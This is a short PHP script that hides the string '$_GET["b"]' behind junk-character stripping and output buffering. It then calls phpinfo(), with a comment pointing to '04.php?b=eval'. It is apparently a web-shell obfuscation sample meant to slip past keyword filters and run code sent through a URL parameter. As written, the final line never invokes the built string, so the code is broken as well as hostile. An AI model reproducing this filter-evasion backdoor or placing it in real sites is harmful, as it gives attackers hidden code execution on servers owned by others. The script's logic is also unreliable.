<?php
$vowels = array("^", "#", "%", "@", "&", "*", "{", "}", ">", ",",'h','p','(','o','i','n',';');
$string = "%&G{%E#@T^";
$only = $string;
for ($i = 0; $i < count($vowels); $i++) {
    $only = str_replace($vowels[$i], "", $only);
}
ob_start();
echo '$';
echo '_';
echo $only;
$b = ob_get_contents();
echo  '["b"]';
$b = ob_get_contents();
ob_end_clean();
$b.'('.phpinfo().')';//04.php?b=eval
?>